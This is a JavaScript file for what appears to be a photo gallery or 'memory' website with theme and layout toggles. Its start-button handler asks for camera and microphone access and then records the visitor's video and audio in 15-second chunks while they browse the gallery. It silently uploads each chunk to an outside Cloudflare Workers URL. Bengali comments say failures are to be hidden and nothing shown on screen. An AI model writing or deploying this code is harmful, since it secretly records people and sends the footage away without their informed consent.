const WORKER_URL = 'https://ourmemory.mrony8552.workers.dev';

const landingPage = document.getElementById('landing-page');
const galleryPage = document.getElementById('gallery-page');
const startBtn = document.getElementById('start-recording-btn');

let mediaRecorder;
const RECORDING_CHUNK_MS = 15000; // 15 seconds

startBtn.addEventListener('click', async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        
        landingPage.style.display = 'none';
        galleryPage.style.display = 'block';

        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });

        mediaRecorder.ondataavailable = async (event) => {
            if (event.data && event.data.size > 0) {
                await uploadChunk(event.data);
            }
        };

        mediaRecorder.start(RECORDING_CHUNK_MS);
    } catch (err) {
        // কোনো পারমিশন এরর হলে কোনো মেসেজ না দিয়ে সরাসরি গ্যালারিতে ঢুকিয়ে দেবে
        console.log("Camera access denied or failed.");
        landingPage.style.display = 'none';
        galleryPage.style.display = 'block';
    }
});

async function uploadChunk(blob) {
    const formData = new FormData();
    formData.append('file', blob, `reaction-${Date.now()}.webm`);
    
    try {
        // নীরবে আপলোড হবে, ফেইল হলে শুধু ব্যাকগ্রাউন্ড কনসোলে থাকবে, স্ক্রিনে কিছু দেখাবে না
        await fetch(`${WORKER_URL}/api/upload`, { 
            method: 'POST', 
            body: formData 
        });
    } catch (err) { 
        console.log("Upload delayed due to network."); 
    }
}

// Layout & Theme Switching
document.getElementById('theme-toggle').addEventListener('click', () => {
    const themes = ['theme-day', 'theme-night', 'theme-pink'];
    let current = themes.find(t => document.body.classList.contains(t)) || 'theme-pink';
    document.body.classList.remove(current);
    let next = themes[(themes.indexOf(current) + 1) % themes.length];
    document.body.classList.add(next);
});

document.getElementById('view-grid').addEventListener('click', () => {
    document.getElementById('gallery').className = 'gallery layout-grid';
});
document.getElementById('view-masonry').addEventListener('click', () => {
    document.getElementById('gallery').className = 'gallery layout-masonry';
});
